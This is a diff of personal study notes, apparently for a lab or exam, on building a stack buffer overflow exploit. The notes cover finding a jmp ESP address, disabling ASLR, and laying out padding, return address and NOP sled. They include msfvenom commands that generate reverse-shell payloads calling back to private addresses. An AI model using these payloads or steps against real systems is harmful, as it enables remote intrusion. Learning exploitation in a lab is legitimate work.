@@ -14,4 +14,26 @@ This Rep describes my steps for BoF.
 
 2. Find bad Characters, send all chars, in hex to File and filter out bad ones: 
 3. find a jmp ESP instruction in code, so that we can put in our shellcode 
-4. use mona !mona jmp -r esp -cpb "\x00\x1a" use jump esp instruction. 
+4. Windows: use mona !mona jmp -r esp -cpb "\x00\x1a" use jump esp instruction, to fin the right address. 
+   Linux: need to disable ASLR: 
+   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+   check with: 
+   cat /proc/sys/kernel/randomize_va_space
+   needs to be 0, 2 means activated
+    in ebd, use plugin Optcode searcher and look for ESP - EIP, and first instruction that has jmp ESP
+5. take the address of jump instruction and write it backwards, ex: 0x5e9a515e -> EIP="\x5e\x51\x9a\x5e" 
+6. new code: #buf = b"A" * OFFSET + EIP   
+7. next add 16x NOPs: b"\x90" *16
+8. new code: #buf = b"A" * OFFSET + EIP + "\x90" *16
+9. create the shellcode with MSFvenom:
+       msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f py -v buf -b "\x00\x06\x0a\x1a\x3b\xcf"
+       msfvenom -p windows/exec CMD='cmd.exe' --format c -b "\x00\x06\x0A\x1A\x3B\xCF\x0d\xff" -f raw -o exploit.txt
+       msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.178 LPORT=443 -o exploit.txt -b "\x00\x0a\x1a"
+       msfvenom -a x86 --platform Linux -p linux/x86/shell_reverse_tcp LHOST=192.168.45.221 LPORT=443 -f py -v buf -b "\x00\x0a\x0d\x1a\x20\x43\x75\x9e\xbc"
+9. write final: 
+                f = open("/home/kali/Downloads/exploit.txt", "wb")
+                f.write(buf)
+                f.close()
+
+
+
